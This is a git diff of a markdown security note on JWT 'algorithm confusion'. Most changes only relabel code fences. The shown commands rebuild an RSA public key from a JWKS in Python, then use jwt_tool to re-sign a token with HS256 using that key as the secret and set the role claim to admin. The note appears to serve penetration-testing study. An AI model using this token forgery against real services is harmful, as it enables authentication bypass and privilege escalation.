@@ -4,14 +4,13 @@ date: 2024-8-1
 tags: ["jwt", "jwks", "forge", "cookies"]
 ---
 
----
 ### Abuse #1: Algorithm confusion
 
 #### 0. Sample jwks.json
 
 <div>
 
-```json
+```console
 { 
     "keys": [
         {
@@ -31,31 +30,31 @@ tags: ["jwt", "jwks", "forge", "cookies"]
 
 <div>
 
-```bash
+```console
 python3
 ```
 
-```bash
+```console
 from base64 import urlsafe_b64decode
 ```
 
-```bash
+```console
 from Crypto.PublicKey import RSA
 ```
 
-```bash
+```console
 e = int.from_bytes(urlsafe_b64decode(b'AQAB'))
 ```
 
-```bash
-n = int.from_bytes(urlsafe_b64decode(b'<BASE64_n>'))
+```console
+n = int.from_bytes(urlsafe_b64decode(b'<BASE64_N>'))
 ```
 
-```bash
+```console
 key = RSA.construct((n, e))
 ```
 
-```bash
+```console
 # Save it to public.pem
 print(key.exportKey().decode())
 ```
@@ -66,7 +65,7 @@ print(key.exportKey().decode())
 
 <div>
 
-```bash
+```console
 # For example, modify role to admin
 python3 jwt_tool.py -S hs256 -k public.pem -I -pc role -pv admin <JWT>
 ```
